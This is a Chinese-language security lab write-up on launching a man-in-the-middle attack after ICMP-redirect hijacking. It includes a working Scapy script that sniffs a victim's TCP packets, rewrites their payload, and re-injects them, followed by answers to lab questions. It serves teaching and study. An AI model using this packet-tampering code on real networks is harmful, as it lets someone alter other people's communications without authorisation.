## task2: Launching the MITM Attack

1. 首先利用task1中的ICMP重定向在伪装路由中劫持从受害主机到目的主机的连接
2. 建立连接后使用命令
```bash
sysctl net.ipv4.ip_forward=0
```
关闭转发并运行下面的攻击代码：
```python
#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'liushijie', b'AAAAAAAAA')

       send(newpkt/newdata)
   else:
       send(newpkt)

# f = 'tcp' 
f = 'tcp and ether src 02:42:0a:09:00:05'

pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

```

3. 整个攻击结果截图如下：
在攻击主机上运行如下命令：
![](https://raw.githubusercontent.com/kryonsir/handsonsecuritylab/master/lab3/image/3.png)
受害主机的发送如下图：
![](https://raw.githubusercontent.com/kryonsir/handsonsecuritylab/master/lab3/image/4.png)
目的主机接收到的如下图，第一行是攻击之前，第二行是开始攻击之后
![](https://raw.githubusercontent.com/kryonsir/handsonsecuritylab/master/lab3/image/2.png)

**liushijie成功被修改为AAAAAAAAA，说明攻击成功。**


**Q4:**
只需要捕获从受害主机到目的主机一个方向的包。因为攻击目的是捕获并修改受害主机发出的包，不需要修改受害主机接收到的包

**Q5:**
在过滤器中应该使用MAC地址，就如上述代码中一样，因为使用ip地址会造成转发风暴。